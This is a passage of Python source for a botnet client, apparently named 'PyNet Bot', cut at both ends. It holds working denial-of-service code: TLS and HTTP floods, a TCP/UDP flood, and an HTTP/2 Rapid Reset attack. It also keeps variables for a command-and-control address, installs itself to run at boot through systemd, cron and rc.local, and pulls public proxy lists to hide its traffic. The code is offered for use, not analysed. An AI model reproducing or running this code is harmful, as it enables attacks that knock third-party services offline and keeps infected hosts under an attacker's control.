    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)',
    'Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) GSA/7.0.55539 Mobile/11D257 Safari/9537.53',
    'Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12F69',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)',
    'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWA Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36',
    'Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0',
    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36',
    'Mozilla/5.0 (Linux; Android 4.4.2; SM-P600 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; rv:35.0) Gecko/20100101 Firefox/35.0',
    'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.22 Safari/537.36',
    'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; LCJB; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 6812.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.153 Safari/537.36',
    'Mozilla/5.0 (X11; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; ASU2JS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.65 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/537.16 (KHTML, like Gecko) Version/8.0 Safari/537.16',
    'Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0',
    'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900V 4G Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/44.1.81 like Chrome/44.0.2403.128 Safari/537.36',
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)',
    'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/11D257 Safari/9537.53',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 4.4.2; GT-P5210 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDSJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Linux; Android 4.4.2; QTAQZ3 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 4.4.2; QMV7B Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko',
    'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/6.0.51363 Mobile/12H321 Safari/600.1.4',
    'Mozilla/5.0 (iPad; CPU OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B436 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321',
    'Mozilla/5.0 (Linux; U; Android 4.0.3; en-ca; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:38.0) Gecko/20100101 Firefox/38.0',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; LCJB; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NISSC; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9) AppleWebKit/537.71 (KHTML, like Gecko) Version/7.0 Safari/537.71',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; MALC; rv:11.0) like Gecko'
]
HTTP_MIX_PATH_SEGMENTS_MAX = 5
HTTP_MIX_QUERY_PARAMS_MAX = 6
HTTP_MIX_POST_DATA_SIZE_MIN = 16
HTTP_MIX_POST_DATA_SIZE_MAX = 128
HTTP_MIX_CONNECTION_MODE = "close"
TLS_FLOOD_THREAD_COUNT = 250
TLS_REQUEST_SLEEP = 0.02
ICMP_THREAD_COUNT = 200
ICMP_PACKET_SIZE_MIN = 16
ICMP_PACKET_SIZE_MAX = 64
ICMP_SEND_DELAY = 0.0000001
SSH_SPAM_THREAD_COUNT = 100
SSH_CONNECT_TIMEOUT = 3
SSH_BANNER_TIMEOUT = 3
SSH_AUTH_TIMEOUT = 3
SSH_HOLD_CONNECTION_MIN = 0.1
SSH_HOLD_CONNECTION_MAX = 1.0
SSH_INTER_ATTEMPT_DELAY_MIN = 0.01
SSH_INTER_ATTEMPT_DELAY_MAX = 0.2
DNS_FLOOD_THREAD_COUNT = 150
DNS_RESOLVER_LIST_URL = "https://raw.githubusercontent.com/trickest/resolvers/main/resolvers-trusted.txt"
DNS_QUERY_SEND_DELAY = 0.001
DNS_QUERY_TYPE_ANY = 0x00ff
DNS_QUERY_TYPE_A = 0x0001
DNS_QUERY_TYPE_AAAA = 0x001c
DNS_QUERY_TYPE_TXT = 0x0010
HTTPVIP_PROCESS_COUNT = 5000
HTTPVIP_REQUEST_DELAY = 0.0
HTTPVIP_TIMEOUT_SECONDS = 2
HTTPVIP_PROXY_SUPPORT = False
HTTPVIP_PROXY_TYPE = "MIXED"
HTTPVIP_USERAGENT_URL = "https://raw.githubusercontent.com/cvandeplas/pystemon/refs/heads/master/user-agents.txt"
HTTPVIP_PROXY_URL_HTTP = "https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies/http.txt"
HTTPVIP_PROXY_URL_SOCKS4 = "https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies/socks4.txt"
HTTPVIP_PROXY_URL_SOCKS5 = "https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies/socks5.txt"

active_attacks = {}
attacks_lock = threading.Lock()
_stop_main_loop = threading.Event()
current_c2_ip = None
current_c2_port = None

def random_payload_func(size):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size)).encode()

def linux_persistence_systemd_func(executable_path):
    try:
        user = os.getenv("USER") or subprocess.check_output("whoami", shell=True, text=True).strip()
        service_content = f"""[Unit]
Description=PyNet Bot
After=network.target
[Service]
ExecStart={executable_path}
Restart=always
User={user}
WorkingDirectory={os.path.dirname(executable_path) or '.'}
[Install]
WantedBy=multi-user.target"""
        service_path = "/etc/systemd/system/pynetbot.service"
        if os.path.exists(service_path):
            with open(service_path, "r") as f: current_content = f.read()
            if executable_path in current_content:
                try: subprocess.run(["systemctl", "is-active", "pynetbot.service"], check=True, capture_output=True)
                except subprocess.CalledProcessError: subprocess.run(["sudo", "systemctl", "start", "pynetbot.service"], check=False)
                return True
        with open(service_path, "w") as f: f.write(service_content)
        subprocess.run(["sudo", "systemctl", "daemon-reload"], check=True)
        subprocess.run(["sudo", "systemctl", "enable", "pynetbot.service"], check=True)
        subprocess.run(["sudo", "systemctl", "start", "pynetbot.service"], check=True)
        return True
    except (FileNotFoundError, PermissionError, subprocess.CalledProcessError, Exception):
        return False

def linux_persistence_cron_func(executable_path):
    try:
        cron_job = f"@reboot {executable_path}\n"
        try:
            current_crontab = subprocess.check_output(["crontab", "-l"], text=True, stderr=subprocess.DEVNULL)
            if executable_path in current_crontab: return True
        except subprocess.CalledProcessError: current_crontab = ""
        except FileNotFoundError: return False
        new_crontab = current_crontab + cron_job
        process = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
        process.communicate(input=new_crontab.encode())
        return process.returncode == 0
    except Exception:
        return False

def linux_persistence_rc_local_func(executable_path):
    rc_local_path = "/etc/rc.local"
    if not os.path.exists(rc_local_path) or not os.access(rc_local_path, os.W_OK): return False
    try:
        with open(rc_local_path, "r") as f: lines = f.readlines()
        if any(executable_path in line for line in lines): return True
        entry = f"{executable_path} &\n"
        inserted = False
        for i, line in enumerate(lines):
            if line.strip() == "exit 0":
                lines.insert(i, entry); inserted = True; break
        if not inserted: lines.append(entry)
        with open(rc_local_path, "w") as f: f.writelines(lines)
        os.chmod(rc_local_path, 0o755)
        return True
    except (PermissionError, Exception):
        return False

def get_executable_path():
    if getattr(sys, 'frozen', False):
        return sys.executable
    return os.path.abspath(sys.argv[0])

def apply_persistence(executable_path):
    if not executable_path:
        return
    if linux_persistence_systemd_func(executable_path):
        return
    if linux_persistence_cron_func(executable_path):
        return
    linux_persistence_rc_local_func(executable_path)

USER_AGENTS_TLS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15"
]

def parse_target_domain_tls(target_domain_input):
    hostname = target_domain_input
    if target_domain_input.startswith("https://"):
        hostname = target_domain_input[len("https://"):]
    elif target_domain_input.startswith("http://"):
        hostname = target_domain_input[len("http://"):]
    if "/" in hostname:
        hostname = hostname.split("/")[0]
    return hostname

def tls_flood_worker(target_host_input, target_port, stop_event):
    target_host = parse_target_domain_tls(target_host_input)
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    while not stop_event.is_set():
        conn = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(SOCKET_TIMEOUT)
            conn = context.wrap_socket(sock, server_hostname=target_host)
            conn.connect((target_host, target_port))
            random_path = "/?" + "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(8))
            http_request = (
                f"GET {random_path} HTTP/1.1\r\n"
                f"Host: {target_host}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS_TLS)}\r\n"
                f"Accept: */*\r\n"
                f"Connection: close\r\n\r\n"
            )
            conn.sendall(http_request.encode('utf-8'))
        except (ssl.SSLError, socket.error, socket.timeout, ConnectionRefusedError):
            pass
        except Exception:
            pass
        finally:
            if conn:
                try: conn.close()
                except: pass
            elif 'sock' in locals() and sock:
                try: sock.close()
                except: pass
        if stop_event.is_set(): break
        time.sleep(TLS_REQUEST_SLEEP + random.uniform(0, 0.05))

def start_tls_flood_attack(target_domain_input, target_port, duration_seconds, attack_id):
    stop_event = threading.Event()
    with attacks_lock:
        active_attacks[attack_id] = stop_event
    threads = []
    for _ in range(TLS_FLOOD_THREAD_COUNT):
        if stop_event.is_set(): break
        thread = threading.Thread(target=tls_flood_worker, args=(target_domain_input, target_port, stop_event), daemon=True)
        threads.append(thread)
        thread.start()
    time.sleep(duration_seconds)
    stop_event.set()
    for t in threads:
        t.join(timeout=SOCKET_TIMEOUT + 1)
    with attacks_lock:
        if attack_id in active_attacks:
            del active_attacks[attack_id]

def generate_random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def http_mix_worker(target_ip, target_port, stop_event):
    while not stop_event.is_set():
        s = None
        try:
            scheme = "https" if target_port == 443 else "http"
            user_agent = random.choice(HTTP_MIX_USER_AGENTS)
            num_path_segments = random.randint(1, HTTP_MIX_PATH_SEGMENTS_MAX)
            path_segments = [generate_random_string(random.randint(3, 10)) for _ in range(num_path_segments)]
            path = "/" + "/".join(path_segments)
            headers_list = [
                f"Host: {target_ip}",
                f"User-Agent: {user_agent}",
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                f"Accept-Language: en-US,en;q=0.5",
                f"Accept-Encoding: gzip, deflate, br",
                f"Connection: {HTTP_MIX_CONNECTION_MODE}",
                f"Upgrade-Insecure-Requests: 1",
                f"Cache-Control: no-cache",
                f"Pragma: no-cache"
            ]
            payload = b""
            method = random.choice(["GET", "POST"])
            if method == "GET":
                num_query_params = random.randint(0, HTTP_MIX_QUERY_PARAMS_MAX)
                query_params = {}
                for _ in range(num_query_params):
                    key = generate_random_string(random.randint(3, 8))
                    value = generate_random_string(random.randint(5, 15))
                    query_params[key] = value
                if query_params:
                    path += "?" + urllib.parse.urlencode(query_params)
                request_line = f"GET {path} HTTP/1.1\r\n"
            else:
                post_data_size = random.randint(HTTP_MIX_POST_DATA_SIZE_MIN, HTTP_MIX_POST_DATA_SIZE_MAX)
                if random.choice([True, False]):
                    num_form_fields = random.randint(1, 5)
                    form_data = {}
                    for _ in range(num_form_fields):
                        key = generate_random_string(random.randint(3,10))
                        value = generate_random_string(random.randint(5,20))
                        form_data[key] = value
                    payload = urllib.parse.urlencode(form_data).encode('utf-8')
                    headers_list.append("Content-Type: application/x-www-form-urlencoded")
                else:
                    payload = generate_random_string(post_data_size).encode('utf-8')
                    headers_list.append("Content-Type: application/octet-stream")
                headers_list.append(f"Content-Length: {len(payload)}")
                request_line = f"POST {path} HTTP/1.1\r\n"
            headers = "\r\n".join(headers_list) + "\r\n\r\n"
            request = request_line.encode('utf-8') + headers.encode('utf-8') + payload
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(HTTP_MIX_REQUEST_TIMEOUT)
            if scheme == "https":
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target_ip)
            s.connect((target_ip, target_port))
            s.sendall(request)
            if HTTP_MIX_CONNECTION_MODE == "keep-alive":
                try:
                    s.recv(1024)
                except socket.timeout:
                    pass
                except Exception:
                    pass
        except socket.timeout:
            pass
        except ssl.SSLError:
            pass
        except socket.error:
            pass
        except Exception:
            pass
        finally:
            if s:
                try:
                    s.close()
                except Exception:
                    pass
        if stop_event.is_set():
            break

def start_http_mix_attack(target_ip, target_port, duration_seconds):
    attack_id = str(uuid.uuid4())
    print(f"Bot: Starting HTTP-MIX flood on {target_ip}:{target_port} for {duration_seconds}s. ID: {attack_id}")
    stop_event = threading.Event()
    with attacks_lock:
        active_attacks[attack_id] = stop_event
    threads = []
    for _ in range(HTTP_MIX_THREAD_COUNT):
        if stop_event.is_set():
            break
        thread = threading.Thread(target=http_mix_worker, args=(target_ip, target_port, stop_event), daemon=True)
        threads.append(thread)
        thread.start()
    time.sleep(duration_seconds)
    stop_event.set()
    for t in threads:
        t.join(timeout=HTTP_MIX_REQUEST_TIMEOUT + 1)
    with attacks_lock:
        if attack_id in active_attacks:
            del active_attacks[attack_id]
    print(f"Bot: HTTP-MIX flood finished for ID: {attack_id}")

def tcp_connect_closer(target_ip, target_port, stop_event):
    while not stop_event.is_set():
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(HOME_TCP_CONNECT_TIMEOUT)
            sock.connect((target_ip, target_port))
        except socket.timeout:
            pass
        except socket.error:
            pass
        except Exception:
            pass
        finally:
            if sock:
                try:
                    sock.shutdown(socket.SHUT_RDWR)
                except socket.error:
                    pass
                except Exception:
                    pass
                try:
                    sock.close()
                except Exception:
                    pass
        if stop_event.is_set():
            break

def udp_sender_home(target_ip, target_port, stop_event):
    try:
        udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except socket.error:
        return
    while not stop_event.is_set():
        try:
            payload_size = random.randint(HOME_UDP_PAYLOAD_SIZE_MIN, HOME_UDP_PAYLOAD_SIZE_MAX)
            payload = random_payload_func(payload_size)
            udp_sock.sendto(payload, (target_ip, target_port))
            if HOME_FLOOD_SEND_DELAY > 0:
                time.sleep(HOME_FLOOD_SEND_DELAY)
        except socket.error:
            time.sleep(0.01)
        except Exception:
            time.sleep(0.05)
            break
        if stop_event.is_set():
            break
    udp_sock.close()

def start_home_flood(target_ip, target_port, duration_seconds):
    attack_id = str(uuid.uuid4())
    print(f"Bot: Starting HOME Flood (TCP Connect/Close + UDP) on {target_ip}:{target_port} for {duration_seconds}s. ID: {attack_id}")
    stop_event = threading.Event()
    with attacks_lock:
        active_attacks[attack_id] = stop_event
    threads = []
    for _ in range(HOME_TCP_THREAD_COUNT):
        if stop_event.is_set(): break
        thread = threading.Thread(target=tcp_connect_closer, args=(target_ip, target_port, stop_event), daemon=True)
        threads.append(thread)
        thread.start()
    for _ in range(HOME_UDP_THREAD_COUNT):
        if stop_event.is_set(): break
        thread = threading.Thread(target=udp_sender_home, args=(target_ip, target_port, stop_event), daemon=True)
        threads.append(thread)
        thread.start()
    time.sleep(duration_seconds)
    stop_event.set()
    join_timeout = max(2.0, HOME_TCP_CONNECT_TIMEOUT + 0.5)
    for t in threads:
        t.join(timeout=join_timeout)
    with attacks_lock:
        if attack_id in active_attacks:
            del active_attacks[attack_id]
    print(f"Bot: HOME Flood finished for ID: {attack_id}")

def generate_random_path_http_v2():
    return "/" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(5, 15)))

def http_v2_worker(target_ip, target_port, stop_event):
    scheme = "https" if target_port == 443 else "http"
    authority = f"{target_ip}:{target_port}" if target_port not in [80, 443] else target_ip
    conn = None
    sock = None
    sock_for_h2 = None
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(HTTP2_V2_CONNECTION_TIMEOUT)
            if scheme == "https":
                context = ssl.create_default_context()
                context.set_alpn_protocols(["h2"])
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock.connect((target_ip, target_port))
                tls_sock = context.wrap_socket(sock, server_hostname=target_ip)
                tls_sock.settimeout(HTTP2_V2_TLS_HANDSHAKE_TIMEOUT)
                negotiated_protocol = tls_sock.selected_alpn_protocol()
                if negotiated_protocol != "h2":
                    if tls_sock: tls_sock.close()
                    sock = None
                    time.sleep(1)
                    continue
                sock_for_h2 = tls_sock
            else:
                if sock: sock.close()
                sock = None
                return
            conn = H2Connection(client_side=True)
            conn.initiate_connection()
            sock_for_h2.sendall(conn.data_to_send())
            sock_for_h2.settimeout(HTTP2_V2_CONNECTION_TIMEOUT)
            if HTTP2_V2_SOCKET_RCVBUF_SIZE > 0:
                 sock_for_h2.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, HTTP2_V2_SOCKET_RCVBUF_SIZE)
            settings_acked = False
            initial_connection_active = True
            while initial_connection_active and not stop_event.is_set():
                try:
                    data_received = sock_for_h2.recv(65535)
                    if not data_received:
                        initial_connection_active = False
                        break
                except socket.timeout:
                     if not settings_acked: settings_acked = True
                     break
                except Exception:
                    initial_connection_active = False
                    break
                events = conn.receive_data(data_received)
                for event in events:
                    if isinstance(event, SettingsAcknowledged):
                        settings_acked = True
                        initial_connection_active = False
                        break
                    elif isinstance(event, RemoteSettingsChanged):
                         if SettingCodes.INITIAL_WINDOW_SIZE in event.changed_settings:
                            new_window = event.changed_settings[SettingCodes.INITIAL_WINDOW_SIZE].new_value
                            conn.increment_flow_control_window(new_window)
                    elif isinstance(event, ConnectionTerminated):
                        initial_connection_active = False
                        break
                if not initial_connection_active: break
                outbound_data = conn.data_to_send()
                if outbound_data:
                    sock_for_h2.sendall(outbound_data)
                if not settings_acked and conn.state_machine.state == 'CLOSED':
                    initial_connection_active = False
            if not settings_acked and not initial_connection_active :
                if sock_for_h2: sock_for_h2.close()
                sock_for_h2 = None
                sock = None
                conn = None
                time.sleep(0.5)
                continue
            while not stop_event.is_set():
                stream_ids_to_reset = []
                for i in range(HTTP2_V2_STREAMS_PER_BURST):
                    if stop_event.is_set(): break
                    try:
                        stream_id = conn.get_next_available_stream_id()
                        headers = [
                            (':method', 'GET'),
                            (':path', generate_random_path_http_v2()),
                            (':scheme', scheme),
                            (':authority', authority),
                            ('user-agent', random.choice(HTTP_MIX_USER_AGENTS))
                        ]
                        conn.send_headers(stream_id, headers)
                        if random.random() < HTTP2_V2_RESET_RATIO:
                            stream_ids_to_reset.append(stream_id)
                    except Exception:
                        break
                outbound_data = conn.data_to_send()
                if outbound_data:
                    try:
                        sock_for_h2.sendall(outbound_data)
                    except Exception: break
                for stream_id_to_reset in stream_ids_to_reset:
                    if stop_event.is_set(): break
                    try:
                        conn.reset_stream(stream_id_to_reset, error_code=ErrorCodes.CANCEL)
                    except Exception:
                        pass
                outbound_data = conn.data_to_send()
                if outbound_data:
                    try:
                        sock_for_h2.sendall(outbound_data)
                    except Exception: break
                if stop_event.is_set() or conn.state_machine.state == 'CLOSED':
                    break
                try:
                    sock_for_h2.settimeout(0.01)
                    data_received = sock_for_h2.recv(65535)
                    sock_for_h2.settimeout(HTTP2_V2_CONNECTION_TIMEOUT)
                    if data_received:
                        events = conn.receive_data(data_received)
                        for event in events:
                            if isinstance(event, ConnectionTerminated):
                                if conn.state_machine.state == 'CLOSED': break
                            elif isinstance(event, WindowUpdated):
                                if event.stream_id == 0:
                                    conn.increment_flow_control_window(event.delta, stream_id=0)
                                else:
                                    conn.increment_flow_control_window(event.delta, stream_id=event.stream_id)
                        outbound_data = conn.data_to_send()
                        if outbound_data: sock_for_h2.sendall(outbound_data)
                    elif not data_received and conn.state_machine.state != 'CLOSED':
                         break
                except socket.timeout:
                    pass
                except Exception:
                    break
                if conn.state_machine.state == 'CLOSED': break
                time.sleep(random.uniform(HTTP2_V2_INTER_BURST_DELAY_MIN, HTTP2_V2_INTER_BURST_DELAY_MAX))
        except socket.timeout:
            pass
        except ssl.SSLError:
            pass
        except ConnectionRefusedError:
            time.sleep(0.2)
        except Exception:
            pass
        finally:
            if conn:
                try:
                    conn.close_connection()
                    if sock_for_h2:
                        out_data = conn.data_to_send()
                        if out_data: sock_for_h2.sendall(out_data)
                except Exception:
                    pass
            if sock_for_h2:
                try:
                    sock_for_h2.shutdown(socket.SHUT_RDWR)
                except: pass
                try:
                    sock_for_h2.close()
                except: pass
            elif sock:
                 try:
                    sock.shutdown(socket.SHUT_RDWR)
                 except: pass
                 try:
                    sock.close()
                 except: pass
            conn = None
            sock = None
            sock_for_h2 = None
            if stop_event.is_set():
                 break
            time.sleep(0.1)

def start_http_v2_attack(target_ip, target_port, duration_seconds):
    attack_id = str(uuid.uuid4())
    print(f"Bot: Starting HTTP/2 Rapid Reset Attack on {target_ip}:{target_port} for {duration_seconds}s. ID: {attack_id}")
    stop_event = threading.Event()
    with attacks_lock:
        active_attacks[attack_id] = stop_event
    threads = []
    for _ in range(HTTP2_V2_THREAD_COUNT):
        if stop_event.is_set():
            break
        thread = threading.Thread(target=http_v2_worker, args=(target_ip, target_port, stop_event), daemon=True)
        threads.append(thread)
        thread.start()
    time.sleep(duration_seconds)
    stop_event.set()
    for t in threads:
        t.join(timeout=HTTP2_V2_CONNECTION_TIMEOUT + 1)
    with attacks_lock:
        if attack_id in active_attacks:
            del active_attacks[attack_id]
    print(f"Bot: HTTP/2 Rapid Reset Attack finished for ID: {attack_id}")

class HTTPVIPAttacker:
    def __init__(self, target, port, duration, thread_id):
        self.target = target
        self.port = port
        self.duration = duration
        self.thread_id = thread_id
        self.stop_event = threading.Event()
        self.user_agents = []
        self.proxies = {"http": [], "socks4": [], "socks5": []}
        self.request_count = 0
        self.connection_pool = []
        self.load_resources()

    def load_resources(self):
        try:
            ua_response = requests.get(HTTPVIP_USERAGENT_URL, timeout=3)
            self.user_agents = [ua.strip() for ua in ua_response.text.split("\n") if len(ua.strip()) > 10]
        except:
            self.user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
